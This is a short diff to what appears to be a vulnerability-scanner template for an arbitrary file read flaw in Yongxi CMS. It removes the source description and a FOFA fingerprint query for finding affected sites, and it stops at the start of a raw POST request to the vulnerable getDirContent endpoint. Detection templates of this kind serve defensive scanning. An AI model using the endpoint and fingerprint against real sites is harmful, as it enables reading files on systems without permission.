@@ -3,12 +3,8 @@ info:
   name: 雍熙cms index 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oo5blcdsxtey5wow'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oo5blcdsxtey5wow
-    fofa: body="g_sybannr" || body="ys_navph2_modal"
 http:
 - raw:
   - 'POST /index.php?s=/Yongsylogin/Ueditor/getDirContent HTTP/1.1
